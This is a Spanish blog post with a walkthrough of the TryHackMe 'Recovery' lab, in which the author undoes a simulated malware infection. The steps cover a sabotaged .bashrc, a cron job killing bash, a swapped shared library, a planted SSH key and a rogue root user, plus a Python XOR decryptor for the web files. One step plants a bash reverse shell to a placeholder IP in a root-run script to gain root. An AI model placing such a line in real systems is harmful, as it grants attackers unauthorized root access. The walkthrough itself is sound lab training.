<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días"><meta name="hour-prompt" content="horas"><meta name="minute-prompt" content="minutos"><meta name="justnow-prompt" content="ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Resolución de máquina Recovery - TryHackMe" /><meta property="og:locale" content="es" /><meta name="description" content="Introducción" /><meta property="og:description" content="Introducción" /><link rel="canonical" href="https://c04tl.github.io/posts/THM-Recovery/" /><meta property="og:url" content="https://c04tl.github.io/posts/THM-Recovery/" /><meta property="og:site_name" content="Página de c04tl" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-25T00:00:00-06:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Resolución de máquina Recovery - TryHackMe" /><meta name="twitter:site" content="@c04tl" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-11-25T00:00:00-06:00","datePublished":"2021-11-25T00:00:00-06:00","description":"Introducción","headline":"Resolución de máquina Recovery - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://c04tl.github.io/posts/THM-Recovery/"},"url":"https://c04tl.github.io/posts/THM-Recovery/"}</script><title>Resolución de máquina Recovery - TryHackMe | Página de c04tl</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Página de c04tl"><meta name="application-name" content="Página de c04tl"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Página de c04tl</a></div><div class="site-subtitle font-italic">Powered by guacamole</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE MÍ</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitch.tv/c04tl" aria-label="twitch" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitch"></i> </a> <a href="https://youtube.com/c04tl" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://twitter.com/c04tl" aria-label="twitter" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://instagram.com/c04tl" aria-label="instagram" class="order-6" target="_blank" rel="noopener"> <i class="fab fa-instagram"></i> </a> <a href="https://github.com/c04tl" aria-label="github" class="order-7" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Resolución de máquina Recovery - TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Resolución de máquina Recovery - TryHackMe</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Luis Medina </span> hace <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Nov 25, 2021, 12:00 AM -0600" >Nov 25, 2021<i class="unloaded">2021-11-25T00:00:00-06:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1194 palabras">6 min lectura</span></div></div><div class="post-content"><h1 id="introducción">Introducción</h1><p>Bienvenidos a mi página y a este post donde veremos como solucionar la máquina Recovery de TryHackMe. Cabe aclarar que en esta máquina no estaremos vulnerando nada sino todo lo contrario, ayudaremos a Alex a solucionar y recuperar los archivos que fueron eliminados por un Malware que le hicieron instalar a través de un ataque de Spear Phishing vía e-mail, dicho mensaje se muestra acontinuación:</p><blockquote><p>Hi Alex, A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix? Regards</p><ul><li>Teo</ul></blockquote><p>Alex nos da las credenciales de <code class="language-plaintext highlighter-rouge">SSH</code> además de brindarnos una interfaz web donde veremos las banderas por cada reparación aplicada al daño causado por el malware fixutil, podemos acceder a esta interfaz en la misma máquina a través del puerto 1337 (por que somos muy hackers).</p><p><strong>Username: alex<br /> Password: madeline</strong></p><h1 id="resolución">Resolución</h1><p>Primeramente nos conectamos por <code class="language-plaintext highlighter-rouge">SSH</code> con las credenciales que Alex nos dio, y como nos contó, se imprime el texto <strong>YOU DIDN’T SAY THE MAGIC WORD</strong> y después de unos instantes se cierra completamente la conexión, pero si tecleamos <code class="language-plaintext highlighter-rouge">CTRL+C</code> mientras se imprime el mensaje, podemos escribir <code class="language-plaintext highlighter-rouge">bash</code> para abrir una nueva instancia de la bash y vamos a poder ejecutar ordenes.</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/1.jpg" alt="SSH" /></p><blockquote><p>Nota: alternativamente podemos escribir <code class="language-plaintext highlighter-rouge">sh</code> y de esta manera la línea de comandos no morirá, esto lo explicaremos más adelante ;)</p></blockquote><h2 id="flag-0">Flag 0</h2><p>Ya que linux lee y ejecuta la ordenes dentro del archivo <code class="language-plaintext highlighter-rouge">.bashrc</code> al principio de la conexión, podemos intuir que el mensaje <strong>YOU DIDN’T SAY THE MAGIC WORD</strong> está dentro de dicho archivo en una orden que lo imprime en todo momento, y al abrirlo con vim podemos ver en la siguiente imagen que efectivamente fue así, <strong>para obtener la flag 0 debemos comentar o eliminar esta línea</strong>.</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/2.jpg" alt="Archivo .bashrc" /></p><h2 id="flag-1">Flag 1</h2><p>Pero después de cierto tiempo se sigue cerrando la conexión, entonces puede tratarse de una tarea cron que se ejecuta en intervalos de tiempo. Para ver las tareas programadas hacemos un <code class="language-plaintext highlighter-rouge">ls -la /etc/cron.d/</code> lo que nos muestra una tarea de nombre <code class="language-plaintext highlighter-rouge">evil</code>, al hacer un <code class="language-plaintext highlighter-rouge">cat /etc/cron.d/evil</code> podemos ver que la tarea ejecuta lo siguiente:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/3.jpg" alt="Tarea evil" /></p><p>Cuando listamos los permisos de este script, podemos ver que tenemos permisos <code class="language-plaintext highlighter-rouge">rwx</code> (lectura, escritura y ejecución) por lo cual lo abrimos con vim y podemos ver un ciclo for que busca los PID (Process ID) de todos los procesos con nombre <code class="language-plaintext highlighter-rouge">bash</code> que se estén ejecutando y va haciendo un <code class="language-plaintext highlighter-rouge">kill</code> a cada uno de ellos, es por esto que <strong><em>debemos comentar o elimnar esta línea para que no se muera nuesta sesión <code class="language-plaintext highlighter-rouge">SSH</code> y podamos conseguir la flag 1</em></strong>.</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/4.jpg" alt="Archivo brilliant_script.sh" /></p><h3 id="análisis-de-fixutil-con-strings">Análisis de fixutil con strings</h3><p>Después de realizar la modifiación, no encontramos pistas para continuar con la reparación del daño, es por esto que utilizamos la herramienta <code class="language-plaintext highlighter-rouge">strings</code> para obtener todas las cadenas imprimibles dentro del ejecutable <code class="language-plaintext highlighter-rouge">fixutil</code> y de esta manera, realizar un ‘reversing’ y poder analizar lo cambios realizados por este malware.</p><p>Al revisar las cadenas obtenidas, nos encontramos con lo que parecen ser nombres de variables y funciones (index_of_encryption_key, webfile_names, XOREncryptWebFiles, encryption_key_dir, rand_string, GetWebFiles, LogIncorrectAttempt, XORFile) lo que nos hace suponer que se aplicó un “cifrado” XOR a los archivos, además, podemos notar lo que parecen ser las tareas ejecutadas por <code class="language-plaintext highlighter-rouge">fixutil</code>:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/5.jpg" alt="Analisis de strings" /></p><ol><li>El archivo en la siguiente ruta <code class="language-plaintext highlighter-rouge">/opt/.fixutil/backup.txt</code> parece sospechoso y solo tiene permisos el usuario propietario (root).<li>Se ejecutó la siguiente línea de comandos <code class="language-plaintext highlighter-rouge">/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so</code> la cual mueve el archivo <code class="language-plaintext highlighter-rouge">logging.so</code> hacia el directorio <code class="language-plaintext highlighter-rouge">/lib/x86_64-linux-gnu/</code> con el nombre <code class="language-plaintext highlighter-rouge">oldliblogging.so</code>.<li>Se añade una llave ssh al archivo de llaves autorizadas del usuario root<li>Se agrega el usuario <code class="language-plaintext highlighter-rouge">security</code> en el grupo de usuarios con privilegios de root además de cambiarle la contraseña a la que se puede ver en la imagen<li>La creación de <code class="language-plaintext highlighter-rouge">brilliant_script</code> y la tarea cron <code class="language-plaintext highlighter-rouge">evil</code></ol><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/6.jpg" alt="Analisis de strings" /></p><ol><li>La modificación del archivo <code class="language-plaintext highlighter-rouge">.bashrc</code> de alex<li>Esta línea de comandos se ejecutó antes de la tarea 2: <code class="language-plaintext highlighter-rouge">/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so</code> la cual copia el archivo <code class="language-plaintext highlighter-rouge">liblogging.so</code> hacía el directorio <code class="language-plaintext highlighter-rouge">/tmp/</code> con el nombre <code class="language-plaintext highlighter-rouge">logging.so</code> pero se deduce que se realizó alguna modificación en algún punto.<li>Se ejecuta la el módulo <code class="language-plaintext highlighter-rouge">liblogging.so</code></ol><p>Dado que las tareas identificadas se realizaron con privilegios elevados y ya que <code class="language-plaintext highlighter-rouge">brilliant_script</code> se ejecuta con privilegios de root, podemos aprovechar los permisos de escritura sobre este archivo y establecer una reverse shell con netcat agregando lo siguiente:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/IP/PUERTO 0&gt;&amp;1'</span>
</pre></table></code></div></div><blockquote><p>Nota: Sustituir IP por nuestra IP y PUERTO por el puerto deseado</p></blockquote><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/7.jpg" alt="configuración de reverse shell" /></p><h2 id="flag-2">Flag 2</h2><p>Una vez obtenida nuestra reverse shell con privilegios elevados, analizamos los archivos .so modificados con la herramienta head y podemos ver los iguiente para el archivo liblogging.so:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/8.jpg" alt="Archivo liblogging.so" /></p><p>Y el archivo oldliblogging.so muestra lo siguiente:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/9.jpg" alt="Archivo oldlogging.so" /></p><p>Debido a los cambios realizados por el malware <strong><em>debemos restaurar el archivo <code class="language-plaintext highlighter-rouge">oldliblogging.so</code></em></strong>, para esto ejecutamos la siguiente linea de comandos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">mv</span> /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
</pre></table></code></div></div><h2 id="flag-3">Flag 3</h2><p>Como vimos durante el analisis se agregó una llave ssh al archivo <code class="language-plaintext highlighter-rouge">authorized_keys</code> del usuario root, por lo cual, <strong><em>nuestra tarea será eliminar dicha llave</em></strong> con la siguiente linea de comandos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">''</span> <span class="o">&gt;</span> /root/.ssh/authorized_keys
</pre></table></code></div></div><h2 id="flag-4">Flag 4</h2><p><strong><em>Para obtener esta bandera necesitamos eliminar el usuario security eliminandolo de los archivos <code class="language-plaintext highlighter-rouge">/etc/passwd</code> y <code class="language-plaintext highlighter-rouge">/etc/shadow</code> manualmente</em></strong> ya que en la máquina no existe la utilidad <code class="language-plaintext highlighter-rouge">userdel</code>, par eliminarlo de el primer archivo usaremos la siguiente línea de comandos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'$d'</span> /etc/passwd
</pre></table></code></div></div><p>Y para eliminarlo del archivo <code class="language-plaintext highlighter-rouge">shadow</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'$d'</span> /etc/shadow
</pre></table></code></div></div><h2 id="flag-5">Flag 5</h2><p>Durante el analisis realizado con <code class="language-plaintext highlighter-rouge">strings</code> pudimos apreciar la creación del directorio oculto <code class="language-plaintext highlighter-rouge">/opt/.fixutil/</code> el cual solo tiene permisos para el usuario propietario(root) y ya que tenemos nuestra reverse shell con privilegios elevados, podemos revisar el contenido de este directorio donde nos encontramos con el archvio <code class="language-plaintext highlighter-rouge">backup.txt</code> el cual continene la contraseña con la que se cifraron los archivos:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/10.jpg" alt="Directorio .fixutil" /></p><p>Mirando en las cadenas obetnidas con <code class="language-plaintext highlighter-rouge">string</code> encontramos el directorio web <code class="language-plaintext highlighter-rouge">/usr/local/apache2/htdocs/</code> y al hacer un <code class="language-plaintext highlighter-rouge">cat</code> para revisar el contenido de los archivos, podemos ver que están cifrados:</p><p><img data-proofer-ignore data-src="/assets/img/1_THM-Recovery/11.jpg" alt="Archivos web" /></p><p>Al tratarse de un cifrado XOR podemos implementar un programa en <code class="language-plaintext highlighter-rouge">python</code> para que descrifre los archivos con la llave que está en el archivo <code class="language-plaintext highlighter-rouge">backup.txt</code>, hay que recordar que la máquina no tiene <code class="language-plaintext highlighter-rouge">python</code> por lo que este proceso se hará local.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span text-data=" Python "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="n">llave</span><span class="o">=</span><span class="sa">b</span><span class="s">"AdsipPewFlfkmll"</span>
<span class="n">archivos</span><span class="o">=</span><span class="p">[</span><span class="s">"index.html"</span><span class="p">,</span><span class="s">"todo.html"</span><span class="p">,</span><span class="s">"reallyimportant.txt"</span><span class="p">]</span>
<span class="n">carpeta_salida</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s">"descifrados"</span><span class="p">)</span>

<span class="n">Path</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="n">carpeta_salida</span><span class="p">)</span>


<span class="k">for</span> <span class="n">elemento</span> <span class="ow">in</span> <span class="n">archivos</span><span class="p">:</span>
    <span class="n">archivo</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">elemento</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span>
    <span class="n">archivo_salida</span><span class="o">=</span><span class="n">Path</span><span class="p">(</span><span class="s">"descifrados"</span><span class="p">,</span> <span class="n">elemento</span><span class="p">)</span>

    <span class="n">salida</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">archivo_salida</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span>
    <span class="n">contenido</span><span class="o">=</span><span class="n">archivo</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">contenido</span><span class="p">)):</span>
        <span class="n">arr</span><span class="o">=</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">contenido</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">llave</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">llave</span><span class="p">)]),</span> <span class="s">'utf-8'</span><span class="p">)</span>
        <span class="n">salida</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">arr</span><span class="p">)</span>
</pre></table></code></div></div><p>Una vez que hemos descifrado todos los archivos, crearemos la carpeta <code class="language-plaintext highlighter-rouge">descifrados</code> en el directorio <code class="language-plaintext highlighter-rouge">home</code> de alex y copiaremos los archivos con la herramienta <code class="language-plaintext highlighter-rouge">scp</code> de la siguiente manera:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>scp descifrados/<span class="k">*</span> alex@10.10.72.227:descifrados
</pre></table></code></div></div><p>A continuación, copiamos los archivos al directorio <code class="language-plaintext highlighter-rouge">/usr/local/apache2/htdocs/</code> con la shell de <code class="language-plaintext highlighter-rouge">root</code> <strong><em>y así obtendríamos la flag 5</em></strong>.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cp</span> /home/alex/descifrados/<span class="k">*</span> <span class="nb">.</span>
</pre></table></code></div></div><h1 id="conclusiones">Conclusiones</h1><p>Con esto terminamos de revertir todos los cambios hechos por el malware y ayudamos a alex a recuperar los archivos que fueron cifrados, espero que les haya gustado y que les haya sido útil, nos vemos hasta otro post y recuerden revisar bien sus correos para no ser victimas de Phishing o Spear Phishing como nuestro amigo Alex ;)</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/bash/" class="post-tag no-text-decoration" >bash</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/strings/" class="post-tag no-text-decoration" >strings</a> <a href="/tags/reversing/" class="post-tag no-text-decoration" >reversing</a> <a href="/tags/malware/" class="post-tag no-text-decoration" >malware</a> <a href="/tags/reverse-shell/" class="post-tag no-text-decoration" >reverse shell</a> <a href="/tags/scp/" class="post-tag no-text-decoration" >scp</a> <a href="/tags/echo/" class="post-tag no-text-decoration" >echo</a> <a href="/tags/sed/" class="post-tag no-text-decoration" >sed</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >python scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Resolución de máquina Recovery - TryHackMe - Página de c04tl&url=https://c04tl.github.io/posts/THM-Recovery/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Resolución de máquina Recovery - TryHackMe - Página de c04tl&u=https://c04tl.github.io/posts/THM-Recovery/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Resolución de máquina Recovery - TryHackMe - Página de c04tl&url=https://c04tl.github.io/posts/THM-Recovery/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar link" title-succeed="¡Link copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Reciente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/THM-Blog/">Resolución de máquina Blog - TryHackMe</a><li><a href="/posts/Bypass-Nginx-403-Forbbiden/">Bypass de código 403 Forbidden en Nginx</a></ul></div><div id="access-tags"> <span>Etiquetas populares</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/strings/">strings</a> <a class="post-tag" href="/tags/attr/">attr</a> <a class="post-tag" href="/tags/bloquedo-de-malware/">Bloquedo de Malware</a> <a class="post-tag" href="/tags/chmod/">chmod</a> <a class="post-tag" href="/tags/chown/">chown</a> <a class="post-tag" href="/tags/configuraci%C3%B3n-de-red/">Configuración de red</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Relacionados</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/THM-Blog/"><div class="card-body"> <span class="timeago small" >Jul 15, 2022<i class="unloaded">2022-07-15T00:00:00-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Resolución de máquina Blog - TryHackMe</h3><div class="text-muted small"><p> Introducción Bienvenidos a mi página y a este post donde veremos como solucionar la máquina Blog de TryHackMe. La resolución de esta máquina la realizamos con la comunidad de Twitch y va dedicada ...</p></div></div></a></div><div class="card"> <a href="/posts/Shell-interactiva/"><div class="card-body"> <span class="timeago small" >Mar 16, 2021<i class="unloaded">2021-03-16T12:00:00-06:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Como obtener una shell interactiva a partir de una dumbshell</h3><div class="text-muted small"><p> Introducción Generalmente cuando obtenemos acceso a través de una conexión inversa o Reverse Shell nos encontramos con el problema que no podemos usar el autocompletado de la consola, a veces el c...</p></div></div></a></div><div class="card"> <a href="/posts/BlackArch-custom/"><div class="card-body"> <span class="timeago small" >Jan 4, 2023<i class="unloaded">2023-01-04T11:00:00-06:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Personalización de blackarch</h3><div class="text-muted small"><p> Introducción En este 